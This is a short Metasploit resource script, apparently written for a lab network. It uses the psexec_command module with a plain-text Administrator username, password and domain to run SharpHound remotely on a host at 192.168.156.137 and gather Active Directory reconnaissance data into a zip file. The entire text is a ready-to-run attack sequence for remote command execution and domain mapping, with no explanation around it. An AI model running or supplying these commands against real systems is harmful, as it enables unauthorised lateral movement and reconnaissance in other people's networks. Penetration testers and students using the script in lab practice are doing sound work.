use auxiliary/admin/smb/psexec_command
set SMBUser administrador
set SMBPass "Vuln3r4bl3..."
set SMBDomain VULNDOMAIN
set SMBSHARE C$
set RHOSTS 192.168.156.137
set command "C:\\BloodhoundClient\\SharpHound.exe --ZipFileName C:\\BloodhoundClient\\Bloodhound_%computername%.zip"
run
